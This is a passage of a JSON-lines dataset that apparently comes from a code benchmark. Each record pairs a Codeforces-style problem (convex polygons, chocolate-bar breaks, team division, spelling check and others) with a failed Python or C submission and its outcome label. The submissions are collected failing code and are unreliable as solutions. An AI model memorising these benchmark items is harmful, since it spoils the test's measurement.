the number of planets in the galaxy, and m (0\u2009\u2264\u2009m\u2009\u2264\u2009105) \u2014 the number of pairs of planets between which Jack can travel using stargates. Then m lines follow, containing three integers each: the i-th line contains numbers of planets ai and bi (1\u2009\u2264\u2009ai,\u2009bi\u2009\u2264\u2009n, ai\u2009\u2260\u2009bi), which are connected through stargates, and the integer transfer time (in seconds) ci (1\u2009\u2264\u2009ci\u2009\u2264\u2009104) between these planets. It is guaranteed that between any pair of planets there is at most one stargate connection. Then n lines follow: the i-th line contains an integer ki (0\u2009\u2264\u2009ki\u2009\u2264\u2009105) that denotes the number of moments of time when other travellers arrive to the planet with index i. Then ki distinct space-separated integers tij (0\u2009\u2264\u2009tij\u2009&lt;\u2009109) follow, sorted in ascending order. An integer tij means that at time tij (in seconds) another traveller arrives to the planet i. It is guaranteed that the sum of all ki does not exceed 105.","output_spec":"Print a single number \u2014 the least amount of time Jack needs to get from planet 1 to planet n. If Jack can't get to planet n in any amount of time, print number -1.","notes":"NoteIn the first sample Jack has three ways to go from planet 1. If he moves to planet 4 at once, he spends 8 seconds. If he transfers to planet 3, he spends 3 seconds, but as other travellers arrive to planet 3 at time 3 and 4, he can travel to planet 4 only at time 5, thus spending 8 seconds in total. But if Jack moves to planet 2, and then \u2014 to planet 4, then he spends a total of only 2\u2009+\u20095\u2009=\u20097 seconds.In the second sample one can't get from planet 1 to planet 3 by moving through stargates.","sample_inputs":["4 6\n1 2 2\n1 3 3\n1 4 8\n2 3 4\n2 4 5\n3 4 3\n0\n1 3\n2 3 4\n0","3 1\n1 2 3\n0\n1 3\n0"],"sample_outputs":["7","-1"]}
{"difficulty":2100,"lang":"Python 2","lang_cluster":"python","src_uid":"d9eb0f6f82bd09ea53a1dbbd7242c497","submission_id":"re_1549","tags":["sortings","geometry"],"exec_outcome":"RUNTIME_ERROR","source_code":"\"\"\"\n6\n-2 1\n0 3\n3 3\n4 1\n3 -2\n2 -2\n4\n0 1\n2 2\n3 1\n1 0\n\"\"\"\n\n\nimport sys\nimport bisect\nimport heapq\nimport math\n\nINF = 10**9+7\nsys.setrecursionlimit(INF)\n\ndef fi():\n    return int(sys.stdin.readline())\n\ndef fi2():\n    return map(int, sys.stdin.readline().split())\n\ndef fi3():\n    return sys.stdin.readline().rstrip()\n\ndef fo(*args):\n    for s in args:\n        sys.stdout.write(str(s)+' ')\n    sys.stdout.write('\\n')\n##    sys.stdout.flush()\n\n##\n    \ndef convex_hull_graham(points):\n\n    TURN_LEFT, TURN_RIGHT, TURN_NONE = (1, -1, 0)\n\n    def cmp(a, b):\n        return (a > b) - (a < b)\n\n    def turn(p, q, r):\n        return cmp((q[0] - p[0])*(r[1] - p[1]) - (r[0] - p[0])*(q[1] - p[1]), 0)\n\n    def _keep_left(hull, r):\n        while len(hull) > 1 and turn(hull[-2], hull[-1], r) != TURN_LEFT:\n            hull.pop()\n        if not len(hull) or hull[-1] != r:\n            hull.append(r)\n        return hull\n\n    points = sorted(points)\n    l = reduce(_keep_left, points, [])\n    u = reduce(_keep_left, reversed(points), [])\n    return l.extend(u[i] for i in range(1, len(u) - 1)) or l\n\n\n##\n#main\n\n\nn1 = fi()\n\nQ = []\nHULL = set()\n\nfor i in range(n1):\n    x, y = fi2()\n    \n    Q.append((x, y))\n    HULL.add((x, y))\n\nn2 = fi()\n\nfor i in range(n2):\n    x, y = fi2()\n    if (x, y) in HULL:\n        fo('NO')\n        exit(0)\n    Q.append((x, y))\n\nS = convex_hull_graham(Q)\n\nfor p in S:\n    if p not in HULL:\n        fo('NO')\n        exit(0)\n\nfo('YES')\n\n\n    \n\n    \n\n\n\n\n\n    \n    \n","description":"You've got another geometrical task. You are given two non-degenerate polygons A and B as vertex coordinates. Polygon A is strictly convex. Polygon B is an arbitrary polygon without any self-intersections and self-touches. The vertices of both polygons are given in the clockwise order. For each polygon no three consecutively following vertices are located on the same straight line.Your task is to check whether polygon B is positioned strictly inside polygon A. It means that any point of polygon B should be strictly inside polygon A. \"Strictly\" means that the vertex of polygon B cannot lie on the side of the polygon A.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (3\u2009\u2264\u2009n\u2009\u2264\u2009105) \u2014 the number of vertices of polygon A. Then n lines contain pairs of integers xi,\u2009yi (|xi|,\u2009|yi|\u2009\u2264\u2009109) \u2014 coordinates of the i-th vertex of polygon A. The vertices are given in the clockwise order. The next line contains a single integer m (3\u2009\u2264\u2009m\u2009\u2264\u20092\u00b7104) \u2014 the number of vertices of polygon B. Then following m lines contain pairs of integers xj,\u2009yj (|xj|,\u2009|yj|\u2009\u2264\u2009109) \u2014 the coordinates of the j-th vertex of polygon B. The vertices are given in the clockwise order. The coordinates of the polygon's vertices are separated by a single space. It is guaranteed that polygons A and B are non-degenerate, that polygon A is strictly convex, that polygon B has no self-intersections and self-touches and also for each polygon no three consecutively following vertices are located on the same straight line.","output_spec":"Print on the only line the answer to the problem \u2014 if polygon B is strictly inside polygon A, print \"YES\", otherwise print \"NO\" (without the quotes).","notes":null,"sample_inputs":["6\n-2 1\n0 3\n3 3\n4 1\n3 -2\n2 -2\n4\n0 1\n2 2\n3 1\n1 0","5\n1 2\n4 2\n3 -3\n-2 -2\n-2 1\n4\n0 1\n1 2\n4 1\n2 -1","5\n-1 2\n2 3\n4 1\n3 -2\n0 -3\n5\n1 0\n1 1\n3 1\n5 -1\n2 -1"],"sample_outputs":["YES","NO","NO"]}
{"difficulty":2000,"lang":"Python 3","lang_cluster":"python","src_uid":"e33b0a752dc1aba25da21e20435e3fe2","submission_id":"re_1260","tags":["binary search","*special"],"exec_outcome":"RUNTIME_ERROR","source_code":"from sys import exit\nn=0\nk=0\ns=\"\"\nfor i in input().split():\n    if n==0:\n        n=int(i)\n    else:\n        k=int(i)\n\ns=str(input())\nnode=[]\nfor i in range(len(s)):\n    if s[int(i)]=='0':\n        node.append(i+1)\n\nnode.append(1000000000)\ndef check(dis):\n    current=0\n    num=k-2\n    for i in range(len(node)-1):\n        if num<1:\n            break\n        if node[i]-node[current]<=dis and node[i+1]-node[current]>dis:\n            current=i\n            num-=1\n    if n-node[current]>dis:\n        return -1\n\n    return 1\n\nleft=1\nright=n\nwhile left+1<right:\n    mid=int((left+right)\/2)\n    t=check(mid)\n    if t==1:\n        right=mid\n    else:\n        left=mid\n    for i in range(left,right+1):\n        if check(i)==1:\n            print(i-1)\n            exit(0)\nprint(0)","description":"Polycarp's workday lasts exactly $$$n$$$ minutes. He loves chocolate bars and can eat one bar in one minute. Today Polycarp has $$$k$$$ bars at the beginning of the workday.In some minutes of the workday Polycarp has important things to do and in such minutes he is not able to eat a chocolate bar. In other minutes he can either eat or not eat one chocolate bar. It is guaranteed, that in the first and in the last minutes of the workday Polycarp has no important things to do and he will always eat bars in this minutes to gladden himself at the begining and at the end of the workday. Also it is guaranteed, that $$$k$$$ is strictly greater than $$$1$$$.Your task is to determine such an order of eating chocolate bars that the maximum break time between eating bars is as minimum as possible.Consider that Polycarp eats a bar in the minute $$$x$$$ and the next bar in the minute $$$y$$$ ($$$x &lt; y$$$). Then the break time is equal to $$$y - x - 1$$$ minutes. It is not necessary for Polycarp to eat all bars he has.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$k$$$ ($$$2 \\le n \\le 200\\,000$$$, $$$2 \\le k \\le n$$$) \u2014 the length of the workday in minutes and the number of chocolate bars, which Polycarp has in the beginning of the workday. The second line contains the string with length $$$n$$$ consisting of zeros and ones. If the $$$i$$$-th symbol in the string equals to zero, Polycarp has no important things to do in the minute $$$i$$$ and he can eat a chocolate bar. In the other case, Polycarp is busy in the minute $$$i$$$ and can not eat a chocolate bar. It is guaranteed, that the first and the last characters of the string are equal to zero, and Polycarp always eats chocolate bars in these minutes.","output_spec":"Print the minimum possible break in minutes between eating chocolate bars.","notes":"NoteIn the first example Polycarp can not eat the chocolate bar in the second minute, so the time of the break equals to one minute.In the second example Polycarp will eat bars in the minutes $$$1$$$ and $$$8$$$ anyway, also he needs to eat the chocolate bar in the minute $$$5$$$, so that the time of the maximum break will be equal to $$$3$$$ minutes.","sample_inputs":["3 3\n010","8 3\n01010110"],"sample_outputs":["1","3"]}
{"difficulty":1800,"lang":"Python 3","lang_cluster":"python","src_uid":"e9c486e2d942700e0644dff29b6e3be6","submission_id":"re_544","tags":["implementation","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"class Scroll:\n\tdef __init__(self, id, power, damage):\n\t\tself.id = id\n\t\tself.power = power\n\t\tself.damage = damage\n\t\tself.active = False\n\nnum_scrolls, boss_max, regenerate = map(int, input().split())\nscrolls = [Scroll(i+1, *map(int, input().split())) for i in range(num_scrolls)]\nscrolls.sort(key = lambda scroll: scroll.damage)\nboss_curr = boss_max\nscroll_damage = 0\nactive_scrolls = []\ntick = 0\nwhile True:\n\tboss_prev = boss_curr\n\tboss_curr -= scroll_damage\n\tboss_curr = min(boss_max, boss_curr + regenerate)\n\tif boss_curr <= 0:\n\t\tprint('YES')\n\t\tprint(tick, len(active_scrolls))\n\t\tfor scroll in active_scrolls:\n\t\t\tprint(scroll.start, scroll.id)\n\t\tbreak\n\tfound = False\n\tfor scroll in scrolls:\n\t\tif not scroll.active and 100*boss_curr <= scroll.power*boss_max:\n\t\t\tscroll.start = tick\n\t\t\tscroll.active = True\n\t\t\tactive_scrolls.append(scroll)\n\t\t\tscroll_damage += scroll.damage\n\t\t\tfound = True\n\t\t\tbreak\n\tif not found and boss_curr >= boss_prev:\n\t\tprint('NO')\n\t\tbreak\n\ttick += 1\n","description":"Vasya\u2019s elder brother Petya loves playing computer games. In one of his favourite computer games Petya reached the final level where a fight with the boss take place.While playing the game Petya found spell scrolls and now he is about to use them. Let\u2019s describe the way fighting goes on this level:1) The boss has two parameters: max \u2014 the initial amount of health and reg \u2014 regeneration rate per second.2) Every scroll also has two parameters: powi \u2014 spell power measured in percents \u2014 the maximal amount of health counted off the initial one, which allows to use the scroll (i.e. if the boss has more than powi percent of health the scroll cannot be used); and dmgi the damage per second inflicted upon the boss if the scroll is used. As soon as a scroll is used it disappears and another spell is cast upon the boss that inflicts dmgi of damage per second upon him until the end of the game.During the battle the actions per second are performed in the following order: first the boss gets the damage from all the spells cast upon him, then he regenerates reg of health (at the same time he can\u2019t have more than max of health), then the player may use another scroll (no more than one per second).The boss is considered to be defeated if at the end of a second he has nonpositive (\u2009\u2264\u20090) amount of health.Help Petya to determine whether he can win with the set of scrolls available to him and if he can, determine the minimal number of seconds he needs to do it.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers N, max and reg (1\u2009\u2264\u2009N,\u2009max,\u2009reg\u2009\u2264\u20091000) \u2013\u2013 the amount of scrolls and the parameters of the boss. The next N lines contain two integers powi and dmgi each \u2014 the parameters of the i-th scroll (0\u2009\u2264\u2009powi\u2009\u2264\u2009100, 1\u2009\u2264\u2009dmgi\u2009\u2264\u20092000). ","output_spec":"In case Petya can\u2019t complete this level, output in the single line NO. Otherwise, output on the first line YES. On the second line output the minimal time after which the boss can be defeated and the number of used scrolls. In the next lines for each used scroll output space-separated number of seconds passed from the start of the battle to the moment the scroll was used and the number of the scroll. Scrolls are numbered starting from 1 in the input order. The first scroll is considered to be available to be used after 0 seconds. Output scrolls in the order they were used. It is not allowed to use scrolls after the boss is defeated.","notes":null,"sample_inputs":["2 10 3\n100 3\n99 1","2 100 10\n100 11\n90 9"],"sample_outputs":["NO","YES\n19 2\n0 1\n10 2"]}
{"difficulty":1500,"lang":"GNU C","lang_cluster":"c","src_uid":"0937a7e2f912fc094cc4275fd47cd457","submission_id":"re_319","tags":["sortings","greedy","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\nlong int index[100010];\nvoid quicksort(long int x[],long int first,long int last){\n    long int pivot,j,temp,i,temp1;\n\n     if(first<last){\n         pivot=first;\n         i=first;\n         j=last;\n\n         while(i<j){\n             while(x[i]<=x[pivot]&&i<last)\n                 i++;\n             while(x[j]>x[pivot])\n                 j--;\n             if(i<j){\n                 temp=x[i];\n                 temp1=index[i];\n                 index[i]=index[j];\n                  x[i]=x[j];\n                  x[j]=temp;\n                  index[j]=temp1;\n             }\n         }\n\n         temp=x[pivot];\n         temp1=index[pivot];\n         x[pivot]=x[j];\n         index[pivot]=index[j];\n         x[j]=temp;\n         index[j]=temp1;\n         quicksort(x,first,j-1);\n         quicksort(x,j+1,last);\n\n    }\n}\n\nint main()\n{\n    long int n,arr[100010],i,c1,c2;\n    scanf(\"%ld\",&n);\n    for(i=0;i<n;i++)\n    {\n        scanf(\"%ld\",&arr[i]);\n        index[i]=i+1;\n    }\n    quicksort(arr,0,n-1);\n    if(n%2==0)\n    {\n        c1=n\/2;\n        c2=n\/2;\n    }\n    else\n    {\n        c1=n\/2+1;\n        c2=n\/2;\n    }\n    printf(\"%ld\\n\",c1);\n    for(i=n-1;i>=0;i-=2)\n        printf(\"%ld\\n\",index[i]);\n    printf(\"%ld\\n\",c2);\n    for(i=n-2;i>=0;i-=2)\n        printf(\"%ld\\n\",index[i]);\n    return 0;\n}\n","description":"Petya loves football very much, especially when his parents aren't home. Each morning he comes to the yard, gathers his friends and they play all day. From time to time they have a break to have some food or do some chores (for example, water the flowers).The key in football is to divide into teams fairly before the game begins. There are n boys playing football in the yard (including Petya), each boy's football playing skill is expressed with a non-negative characteristic ai (the larger it is, the better the boy plays). Let's denote the number of players in the first team as x, the number of players in the second team as y, the individual numbers of boys who play for the first team as pi and the individual numbers of boys who play for the second team as qi. Division n boys into two teams is considered fair if three conditions are fulfilled:  Each boy plays for exactly one team (x\u2009+\u2009y\u2009=\u2009n).  The sizes of teams differ in no more than one (|x\u2009-\u2009y|\u2009\u2264\u20091).  The total football playing skills for two teams differ in no more than by the value of skill the best player in the yard has. More formally: Your task is to help guys divide into two teams fairly. It is guaranteed that a fair division into two teams always exists.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009105) which represents the number of guys in the yard. The next line contains n positive space-separated integers, ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009104), the i-th number represents the i-th boy's playing skills. ","output_spec":"On the first line print an integer x \u2014 the number of boys playing for the first team. On the second line print x integers \u2014 the individual numbers of boys playing for the first team. On the third line print an integer y \u2014 the number of boys playing for the second team, on the fourth line print y integers \u2014 the individual numbers of boys playing for the second team. Don't forget that you should fulfil all three conditions: x\u2009+\u2009y\u2009=\u2009n, |x\u2009-\u2009y|\u2009\u2264\u20091, and the condition that limits the total skills. If there are multiple ways to solve the problem, print any of them. The boys are numbered starting from one in the order in which their skills are given in the input data. You are allowed to print individual numbers of boys who belong to the same team in any order.","notes":"NoteLet's consider the first sample test. There we send the first and the second boy to the first team and the third boy to the second team. Let's check all three conditions of a fair division. The first limitation is fulfilled (all boys play), the second limitation on the sizes of groups (|2\u2009-\u20091|\u2009=\u20091\u2009\u2264\u20091) is fulfilled, the third limitation on the difference in skills ((2\u2009+\u20091)\u2009-\u2009(1)\u2009=\u20092\u2009\u2264\u20092) is fulfilled.","sample_inputs":["3\n1 2 1","5\n2 3 3 1 1"],"sample_outputs":["2\n1 2 \n1\n3","3\n4 1 3 \n2\n5 2"]}
{"difficulty":1500,"lang":"GNU C","lang_cluster":"c","src_uid":"0df064fd0288c2ac4832efa227107a0e","submission_id":"re_318","tags":["implementation","hashing","strings"],"exec_outcome":"COMPILATION_ERROR","source_code":"\/\/Spelling Check - Codeforces\n#include <stdio.h>\n#include <string.h>\n#include <string>\nchar s1[1000001], s2[1000001];\nint n, counta, cantidad, resp2[1000001];\nint main(){\n    scanf(\"%s %s\",s1+1,s2+1);\n    n=strlen(s1+1);\n    for(int i=n;i>=1;--i)\n        if (i==1||s1[i]!=s2[i - 1]){\n            counta = n - i;\n            break;\n        }\n    for(int i=1;i<=n;++i){\n        if(counta>=n-i){\n            resp2[++cantidad] = i;\n        }\n        if(i==n||s1[i]!=s2[i]){\n            break;\n        }\n    }\n    printf(\"%d\\n\", cantidad);\n    if(cantidad!=0){\n        for (int i=1;i<=cantidad;++i){\n            printf(\"%d \", resp2[i]);\n        }\n    }\n    return 0;\n}\n","description":"Petya has noticed that when he types using a keyboard, he often presses extra buttons and adds extra letters to the words. Of course, the spell-checking system underlines the words for him and he has to click every word and choose the right variant. Petya got fed up with correcting his mistakes himself, that\u2019s why he decided to invent the function that will correct the words itself. Petya started from analyzing the case that happens to him most of the time, when all one needs is to delete one letter for the word to match a word from the dictionary. Thus, Petya faces one mini-task: he has a printed word and a word from the dictionary, and he should delete one letter from the first word to get the second one. And now the very non-trivial question that Petya faces is: which letter should he delete?","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains two strings, consisting of lower-case Latin letters. The length of each string is from 1 to 106 symbols inclusive, the first string contains exactly 1 symbol more than the second one.","output_spec":"In the first line output the number of positions of the symbols in the first string, after the deleting of which the first string becomes identical to the second one. In the second line output space-separated positions of these symbols in increasing order. The positions are numbered starting from 1. If it is impossible to make the first string identical to the second string by deleting one symbol, output one number 0.","notes":null,"sample_inputs":["abdrakadabra\nabrakadabra","aa\na","competition\ncodeforces"],"sample_outputs":["1\n3","2\n1 2","0"]}
{"difficulty":900,"lang":"GNU C11","lang_cluster":"c","src_uid":"102667eaa3aee012fef70f4192464674","submission_id":"re_797","tags":["implementation","brute force"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"#include <stdio.h>\n\nint main(void)\n{\n\t\tint n;\n\t\tscanf(\"%d \", &n);\n\n\t\tint n_arr[n];\n\t\tfor (int i = 0; i < n; i++)\n\t\t\t\tscanf(\"%d \", &n_arr[i]);\n\n\t\tint m;\n\t\tscanf(\"%d \", &m);\n\n\t\tint m_arr[n];\n\t\tfor (int i = 0; i < m; i++)\n\t\t\t\tscanf(\"%d \", &m_arr[i]);\n\n\t\tint max = 0, num_max = 0;\n\t\tfor (int i = 0; i < n; i++)\n\t\t\t\tfor (int j = m - 1; j >= 0; j--)\n\t\t\t\t\t\tif (m_arr[j]%n_arr[i] == 0){\n\t\t\t\t\t\t\t\tif (m_arr[j]\/n_arr[i] == max){\n\t\t\t\t\t\t\t\t\t\tnum_max++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif (m_arr[j]\/n_arr[i] > max){\n\t\t\t\t\t\t\t\t\t\tnum_max = 1;\n\t\t\t\t\t\t\t\t\t\tmax = m_arr[j]\/n_arr[i];\n\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\tprintf(\"%d\\n\", num_max);\n}\n\n\t\t\t\t\t\t\n\n","description":"Vasya's bicycle chain drive consists of two parts: n stars are attached to the pedal axle, m stars are attached to the rear wheel axle. The chain helps to rotate the rear wheel by transmitting the pedal rotation.We know that the i-th star on the pedal axle has ai (0\u2009&lt;\u2009a1\u2009&lt;\u2009a2\u2009&lt;\u2009...\u2009&lt;\u2009an) teeth, and the j-th star on the rear wheel axle has bj (0\u2009&lt;\u2009b1\u2009&lt;\u2009b2\u2009&lt;\u2009...\u2009&lt;\u2009bm) teeth. Any pair (i,\u2009j) (1\u2009\u2264\u2009i\u2009\u2264\u2009n;\u00a01\u2009\u2264\u2009j\u2009\u2264\u2009m) is called a gear and sets the indexes of stars to which the chain is currently attached. Gear (i,\u2009j) has a gear ratio, equal to the value .Since Vasya likes integers, he wants to find such gears (i,\u2009j), that their ratios are integers. On the other hand, Vasya likes fast driving, so among all \"integer\" gears (i,\u2009j) he wants to choose a gear with the maximum ratio. Help him to find the number of such gears.In the problem, fraction  denotes division in real numbers, that is, no rounding is performed.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of stars on the bicycle's pedal axle. The second line contains n integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u2009104) in the order of strict increasing. The third input line contains integer m (1\u2009\u2264\u2009m\u2009\u2264\u200950) \u2014 the number of stars on the rear wheel axle. The fourth line contains m integers b1,\u2009b2,\u2009...,\u2009bm (1\u2009\u2264\u2009bi\u2009\u2264\u2009104) in the order of strict increasing. It is guaranteed that there exists at least one gear (i,\u2009j), that its gear ratio is an integer. The numbers on the lines are separated by spaces.","output_spec":"Print the number of \"integer\" gears with the maximum ratio among all \"integer\" gears.","notes":"NoteIn the first sample the maximum \"integer\" gear ratio equals 3. There are two gears that have such gear ratio. For one of them a1\u2009=\u20094,\u2009b1\u2009=\u200912, and for the other a2\u2009=\u20095,\u2009b3\u2009=\u200915.","sample_inputs":["2\n4 5\n3\n12 13 15","4\n1 2 3 4\n5\n10 11 12 13 14"],"sample_outputs":["2","1"]}
{"difficulty":1400,"lang":"GNU C","lang_cluster":"c","src_uid":"138fd96bf5a677a6d59c20f88fd612f1","submission_id":"re_1009","tags":["greedy","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n\nint main()\n{\n     int n, i;\n     long long x, y, a;\n\n     scanf(\"%d %I64d %I64d\", &n, &x, &y);\n\n     a = y - n + 1;\n\n     if (a >= 0 && a * a + n - 1 >= x) {\n\t  for (i = 0; i < n - 1; i++) puts(\"1\");\n\t  printf(\"%I64d\\n\", a);\n     } else {\n\t  puts(\"-1\");\n     }\n\n     return 0;\n}\n","description":"Little Petya loves inequations. Help him find n positive integers a1,\u2009a2,\u2009...,\u2009an, such that the following two conditions are satisfied: a12\u2009+\u2009a22\u2009+\u2009...\u2009+\u2009an2\u2009\u2265\u2009x a1\u2009+\u2009a2\u2009+\u2009...\u2009+\u2009an\u2009\u2264\u2009y","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three space-separated integers n, x and y (1\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20091\u2009\u2264\u2009x\u2009\u2264\u20091012,\u20091\u2009\u2264\u2009y\u2009\u2264\u2009106). Please do not use the %lld specificator to read or write 64-bit integers in \u0421++. It is recommended to use cin, cout streams or the %I64d specificator.","output_spec":"Print n positive integers that satisfy the conditions, one integer per line. If such numbers do not exist, print a single number \"-1\". If there are several solutions, print any of them.","notes":null,"sample_inputs":["5 15 15","2 3 2","1 99 11"],"sample_outputs":["4\n4\n1\n1\n2","-1","11"]}
{"difficulty":1200,"lang":"GNU C","lang_cluster":"c","src_uid":"1ae2942b72ebb7c55359c41e141900d7","submission_id":"re_956","tags":["implementation"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"#include<stdio.h>\nlong long int n,j,i,h[6000],t,a[5],b[5];\nint main()\n{\n\tscanf(\"%lld\",&n);\n\tfor(i=0;i<n;i++) scanf(\"%lld\",h+i);\n\tfor(i=0;i<5;i++) scanf(\"%lld\",a+i);\n\tfor(i=0;i<n;i++)\n\t{\n\t\tt+=h[i];\n\t\tfor(j=4;j>-1;j--)\n\t\t{\n\t\t\tif(t>=a[j]) \n\t\t\t{t-=a[j];b[j++]++;}\n\t\t}\n\t}\n\tfor(i=0;i<5;i++) printf(\"%lld \",b[i]);printf(\"\\n%lld\",t);\n\treturn 0;\n}\n","description":"Vasya, like many others, likes to participate in a variety of sweepstakes and lotteries. Now he collects wrappings from a famous chocolate bar \"Jupiter\". According to the sweepstake rules, each wrapping has an integer written on it \u2014 the number of points that the participant adds to his score as he buys the bar. After a participant earns a certain number of points, he can come to the prize distribution center and exchange the points for prizes. When somebody takes a prize, the prize's cost is simply subtracted from the number of his points.Vasya didn't only bought the bars, he also kept a record of how many points each wrapping cost. Also, he remembers that he always stucks to the greedy strategy \u2014 as soon as he could take at least one prize, he went to the prize distribution centre and exchanged the points for prizes. Moreover, if he could choose between multiple prizes, he chose the most expensive one. If after an exchange Vasya had enough points left to get at least one more prize, then he continued to exchange points.The sweepstake has the following prizes (the prizes are sorted by increasing of their cost):   a mug (costs a points),  a towel (costs b points),  a bag (costs c points),  a bicycle (costs d points),  a car (costs e points). Now Vasya wants to recollect what prizes he has received. You know sequence p1,\u2009p2,\u2009...,\u2009pn, where pi is the number of points Vasya got for the i-th bar. The sequence of points is given in the chronological order. You also know numbers a, b, c, d, e. Your task is to find, how many prizes Vasya received, what prizes they are and how many points he's got left after all operations are completed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of chocolate bar wrappings that brought points to Vasya. The second line contains space-separated integers p1,\u2009p2,\u2009...,\u2009pn (1\u2009\u2264\u2009pi\u2009\u2264\u2009109). The third line contains 5 integers a, b, c, d, e (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009&lt;\u2009c\u2009&lt;\u2009d\u2009&lt;\u2009e\u2009\u2264\u2009109) \u2014 the prizes' costs.","output_spec":"Print on the first line 5 integers, separated by a space \u2014 the number of mugs, towels, bags, bicycles and cars that Vasya has got, respectively. On the second line print a single integer \u2014 the number of points Vasya will have left after all operations of exchange are completed. Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specifier.","notes":"NoteIn the first sample Vasya gets 3 points after eating the first chocolate bar. Then he exchanges 2 points and gets a mug. Vasya wins a bag after eating the second chocolate bar. Then he wins a towel after eating the third chocolate bar. After all chocolate bars 3\u2009-\u20092\u2009+\u200910\u2009-\u200910\u2009+\u20094\u2009-\u20094\u2009=\u20091 points remains.","sample_inputs":["3\n3 10 4\n2 4 10 15 20","4\n10 4 39 2\n3 5 10 11 12"],"sample_outputs":["1 1 1 0 0 \n1","3 0 1 0 3 \n0"]}
{"difficulty":1200,"lang":"GNU C","lang_cluster":"c","src_uid":"3d6411d67c85f6293f1999ccff2cd8ba","submission_id":"re_1419","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\n\nint main(void)\n{\n  int flag=1,count=0,hold,n,k,i,rank[100];\n  scanf(\"%d%d\",&n,&k);\n  for(i=0;i<n;i++)\n    scanf(\"%d\",rank+i);\n  while(flag)\n  {\n    hold=-1;  flag=0;\n    for(i=0;i<n;i++)\n      if(rank[i]<k && rank[i]!=hold)\n      {\n        hold=rank[i];\n        rank[i]+=1;\n        flag=1;\n      }\n    if(flag)  count++;\n  }\n  printf(\"%d\\n\",count);\n  return 0;\n}\n","description":"In a strategic computer game \"Settlers II\" one has to build defense structures to expand and protect the territory. Let's take one of these buildings. At the moment the defense structure accommodates exactly n soldiers. Within this task we can assume that the number of soldiers in the defense structure won't either increase or decrease.Every soldier has a rank \u2014 some natural number from 1 to k. 1 stands for a private and k stands for a general. The higher the rank of the soldier is, the better he fights. Therefore, the player profits from having the soldiers of the highest possible rank.To increase the ranks of soldiers they need to train. But the soldiers won't train for free, and each training session requires one golden coin. On each training session all the n soldiers are present.At the end of each training session the soldiers' ranks increase as follows. First all the soldiers are divided into groups with the same rank, so that the least possible number of groups is formed. Then, within each of the groups where the soldiers below the rank k are present, exactly one soldier increases his rank by one.You know the ranks of all n soldiers at the moment. Determine the number of golden coins that are needed to increase the ranks of all the soldiers to the rank k.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009n,\u2009k\u2009\u2264\u2009100). They represent the number of soldiers and the number of different ranks correspondingly. The second line contains n numbers in the non-decreasing order. The i-th of them, ai, represents the rank of the i-th soldier in the defense building (1\u2009\u2264\u2009i\u2009\u2264\u2009n, 1\u2009\u2264\u2009ai\u2009\u2264\u2009k).","output_spec":"Print a single integer \u2014 the number of golden coins needed to raise all the soldiers to the maximal rank.","notes":"NoteIn the first example the ranks will be raised in the following manner:1 2 2 3 \u2009\u2192\u2009 2 2 3 4 \u2009\u2192\u2009 2 3 4 4 \u2009\u2192\u2009 3 4 4 4 \u2009\u2192\u2009 4 4 4 4Thus totals to 4 training sessions that require 4 golden coins.","sample_inputs":["4 4\n1 2 2 3","4 3\n1 1 1 1"],"sample_outputs":["4","5"]}
{"difficulty":1500,"lang":"GNU C","lang_cluster":"c","src_uid":"4ecbfc792da55f458342c6eff2d5da5a","submission_id":"re_737","tags":["dsu","dfs and similar","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n\nint i, x, y, n, m, succs[101][100], nsuccs[101], seen[101], cedge[101], ncycles ;\n\nint dfs(int root, int from)\n{\n\tint k ;\n\t\n\tseen[root] = 1 ;\n\t\t\n\tfor (k = 0 ; k < nsuccs[root] ; k++)\n\t{\n\t\tif (!seen[succs[root][k]])\n\t\t{\n\t\t\tif (dfs(succs[root][k], root))\n\t\t\t{\n\t\t\t\treturn 1 ;\n\t\t\t}\t\t\t\t\n\t\t}\n\t\telse if (succs[root][k] != from && cedge[root] != succs[root][k])\n\t\t{\n\t\t\tcedge[succs[root][k]] = root ;\n\t\t\t\n\t\t\tif (++ncycles == 2)\n\t\t\t{\n\t\t\t\treturn 1 ;\n\t\t\t}\n\t\t}\n\t}\n\t\n\treturn 0 ;\n}\n\nint main(void)\n{\n\tscanf(\"%d %d\", &n, &m) ;\n\t\t\n\tfor (i = 0 ; i < m ; i++)\n\t{\n\t\tscanf(\"%d %d\", &x, &y) ;\n\t\t\n\t\tsuccs[x][nsuccs[x]++] = y ;\n\t\tsuccs[y][nsuccs[y]++] = x ;\n\t}\n\t\n\tif (n != m)\n\t{\n\t\tprintf(\"NO\") ;\n\t}\n\telse\n\t{\n\t\tdfs(1, 0) ;\n\n\t\tprintf((ncycles == 1 ? \"FHTAGN!\" : \"NO\")) ;\n\t}\n\t\n\treturn 0 ;\n}\n","description":"...Once upon a time a man came to the sea. The sea was stormy and dark. The man started to call for the little mermaid to appear but alas, he only woke up Cthulhu...Whereas on the other end of the world Pentagon is actively collecting information trying to predict the monster's behavior and preparing 